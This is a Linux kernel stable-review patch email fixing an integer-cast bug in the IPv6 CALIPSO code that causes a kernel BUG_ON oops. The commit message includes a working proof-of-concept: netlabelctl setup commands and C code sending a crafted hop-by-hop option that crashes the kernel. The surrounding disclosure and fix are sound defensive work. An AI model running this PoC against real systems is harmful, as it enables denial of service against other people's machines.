Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2DD273D1CA0;
	Thu, 15 Jan 2026 17:53:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1768499614; cv=none; b=o02jxH0yLwhQmnNX3DOLYs9wLXXlQzrWlq9VFNirGPWY+23cp4x5jHzgoAKr1mzvcjrFqfJRsPWk/43pv5TlocSluvPM/r0MOgtSwO4+gZHeQk/czPa2bmBI93kLoD/Y9vXEbH2VN/Wo+rthf8ghQZYyjcbOYipEsP1NmscqyGs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1768499614; c=relaxed/simple;
	bh=wVgN/TUiZr17CLRUvNvFsrzlytdZWsQqlGP231+57n8=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=jriSbAq+GGcuZHEr7AFs396vHwROC/L8SxZOt9DoTjoxRUxkq4Pz120DLHjpyS87/yLpnk+BOzWhVAcbchmfGkhFJzJ4VxtlhdqVjB0ItKxsghyBXv0fSJTJvj9AMjoHVtWI3XwgvXRekEBu4TXCWoiVgbowA4/1PB4b8zUPdHQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=OfF21Zg0; arc=none smtp.client-ip=10.30.226.201
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="OfF21Zg0"
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 6B4A9C116D0;
	Thu, 15 Jan 2026 17:53:33 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1768499613;
	bh=wVgN/TUiZr17CLRUvNvFsrzlytdZWsQqlGP231+57n8=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
	b=OfF21Zg0MR7Ha+CbvjoYm1kHZ7Od7Ev3iz9HFBD+vp50pUP+2Xtw9A8sLJlGOWhDX
	 eQ0WqvT+CNfxESTWekULOHIavrJiHap4QktV4tP0LRPHLw1ZIPQVvHzWy8fulx5yJ2
	 zWH7iSw/m5+8uqz9DbcgjknXu1STERRwXGAlbeiY=
From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
To: stable@vger.kernel.org
Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	patches@lists.linux.dev,
	Paul Moore <paul@paul-moore.com>,
	Will Rosenberg <whrosenb@asu.edu>,
	Paolo Abeni <pabeni@redhat.com>,
	Sasha Levin <sashal@kernel.org>
Subject: [PATCH 5.10 288/451] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
Date: Thu, 15 Jan 2026 17:48:09 +0100
Message-ID: <20260115164241.301432313@linuxfoundation.org>
X-Mailer: git-send-email 2.52.0
In-Reply-To: <20260115164230.864985076@linuxfoundation.org>
References: <20260115164230.864985076@linuxfoundation.org>
User-Agent: quilt/0.69
X-stable: review
X-Patchwork-Hint: ignore
Precedence: bulk
X-Mailing-List: patches@lists.linux.dev
List-Id: <patches.lists.linux.dev>
List-Subscribe: <mailto:patches+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:patches+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

5.10-stable review patch.  If anyone has any objections, please let me know.

------------------

From: Will Rosenberg <whrosenb@asu.edu>

[ Upstream commit 58fc7342b529803d3c221101102fe913df7adb83 ]

There exists a kernel oops caused by a BUG_ON(nhead < 0) at
net/core/skbuff.c:2232 in pskb_expand_head().
This bug is triggered as part of the calipso_skbuff_setattr()
routine when skb_cow() is passed headroom > INT_MAX
(i.e. (int)(skb_headroom(skb) + len_delta) < 0).

The root cause of the bug is due to an implicit integer cast in
__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
that delta = headroom - skb_headroom(skb) is never negative, otherwise
we will trigger a BUG_ON in pskb_expand_head(). However, if
headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
becomes negative, and pskb_expand_head() is passed a negative value for
nhead.

Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
by only using skb_cow() to grow headroom.

PoC:
	Using `netlabelctl` tool:

        netlabelctl map del default
        netlabelctl calipso add pass doi:7
        netlabelctl map add default address:0::1/128 protocol:calipso,7

        Then run the following PoC:

        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

        // setup msghdr
        int cmsg_size = 2;
        int cmsg_len = 0x60;
        struct msghdr msg;
        struct sockaddr_in6 dest_addr;
        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
                        sizeof(struct cmsghdr) + cmsg_len);
        msg.msg_name = &dest_addr;
        msg.msg_namelen = sizeof(dest_addr);
        msg.msg_iov = NULL;
        msg.msg_iovlen = 0;
        msg.msg_control = cmsg;
        msg.msg_controllen = cmsg_len;
        msg.msg_flags = 0;

        // setup sockaddr
        dest_addr.sin6_family = AF_INET6;
        dest_addr.sin6_port = htons(31337);
        dest_addr.sin6_flowinfo = htonl(31337);
        dest_addr.sin6_addr = in6addr_loopback;
        dest_addr.sin6_scope_id = 31337;

        // setup cmsghdr
        cmsg->cmsg_len = cmsg_len;
        cmsg->cmsg_level = IPPROTO_IPV6;
        cmsg->cmsg_type = IPV6_HOPOPTS;
        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80

        sendmsg(fd, &msg, 0);

Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly.")
Suggested-by: Paul Moore <paul@paul-moore.com>
Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
Acked-by: Paul Moore <paul@paul-moore.com>
Link: https://patch.msgid.link/20251219173637.797418-1-whrosenb@asu.edu
Signed-off-by: Paolo Abeni <pabeni@redhat.com>
Signed-off-by: Sasha Levin <sashal@kernel.org>
---
 net/ipv6/calipso.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
index 59997e5d1343..c2e716601ed3 100644
--- a/net/ipv6/calipso.c
+++ b/net/ipv6/calipso.c
@@ -1345,7 +1345,8 @@ static int calipso_skbuff_setattr(struct sk_buff *skb,
 	/* At this point new_end aligns to 4n, so (new_end & 4) pads to 8n */
 	pad = ((new_end & 4) + (end & 7)) & 7;
 	len_delta = new_end - (int)end + pad;
-	ret_val = skb_cow(skb, skb_headroom(skb) + len_delta);
+	ret_val = skb_cow(skb,
+			  skb_headroom(skb) + (len_delta > 0 ? len_delta : 0));
 	if (ret_val < 0)
 		return ret_val;
 
-- 
2.51.0



